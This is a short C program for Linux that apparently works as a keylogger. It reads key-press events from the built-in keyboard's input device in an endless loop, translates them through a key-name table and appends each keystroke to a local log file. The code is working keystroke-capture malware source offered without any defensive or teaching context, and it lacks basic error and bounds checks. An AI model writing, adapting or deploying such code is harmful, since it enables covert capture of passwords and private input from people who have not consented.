#include <fcntl.h>
#include <linux/uinput.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#define UK 0


int main()
{

  static char *code_key_table[] = {
   UK, "<ESC>",
   "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
   "<Backspace>", "<Tab>",
   "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
   "[", "]", "<Enter>", "<LCtrl>",
   "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
   "'", "`", "<LShift>",
   "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
   "<RShift>",
   "<KP*>",
   "<LAlt>", " ", "<CapsLock>",
   "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
   "<NumLock>", "<ScrollLock>",
   "<KP7>", "<KP8>", "<KP9>",
   "<KP->",
   "<KP4>", "<KP5>", "<KP6>",
   "<KP+>",
   "<KP1>", "<KP2>", "<KP3>", "<KP0>",
   "<KP.>",
   UK, UK, UK,
   "<F11>", "<F12>",
   UK, UK, UK, UK, UK, UK, UK,
   "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
   "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
   "<PageDown>", "<Insert>", "<Delete>"
};

  char *device_file_name = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  int fd;
  int logfile_fd;

  if((logfile_fd = open("log_file.txt", O_WRONLY | O_APPEND | O_CREAT, S_IROTH	)) < 0)
  {
    printf("Failed to create log_file\r\n");
  }


  fd = open(device_file_name, O_RDONLY);

  struct input_event input_struct;
  while(1)
  {
    read(fd, &input_struct, sizeof(input_struct));
    if((input_struct.type == EV_KEY) && (input_struct.value == 1))
    {
      write(logfile_fd, code_key_table[input_struct.code], strlen(code_key_table[input_struct.code]));
  }
}

  close(fd);
  close(logfile_fd);
}
